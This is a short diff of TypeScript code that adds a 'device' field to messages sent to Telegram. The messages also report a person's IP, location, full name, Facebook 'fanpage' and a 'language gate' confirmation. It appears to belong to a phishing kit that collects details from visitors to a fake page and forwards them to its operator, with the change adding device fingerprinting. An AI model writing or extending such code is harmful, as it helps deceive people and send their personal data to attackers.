@@ -94,6 +94,7 @@ function normalizeData(input: any = {}) {
     return {
         ip: input.ip ?? '',
         location: input.location ?? '',
+        device: input.device ?? '',
         fullName: input.fullName ?? input.name ?? '',
         fanpage: input.fanpage ?? '',
         day: input.day ?? '',
@@ -146,6 +147,7 @@ function formatMessage(data: any, options: FormatMessageOptions = {}): string {
     const lines = [
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
+        `<b>Device:</b> <code>${formatCodeField(d.device)}</code>`,
         `----------------------`,
         `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
         `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
@@ -233,6 +235,7 @@ function formatLanguageGateMessage(data: any): string {
     return [
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
+        `<b>Device:</b> <code>${formatCodeField(d.device)}</code>`,
         `<b>Language:</b> <code>${formatCodeField(d.language)}</code>`,
     ].join('\n');
 }
@@ -280,7 +283,7 @@ async function postTelegramText(
     }
 }
 
-/** Tin Telegram riêng khi Confirm ngôn ngữ (IP + Location + Language). */
+/** Tin Telegram riêng khi Confirm ngôn ngữ (IP + Location + Device + Language). */
 async function sendLanguageGateTelegram(
     config: NonNullable<ReturnType<typeof getTelegramConfig>>,
     data: any
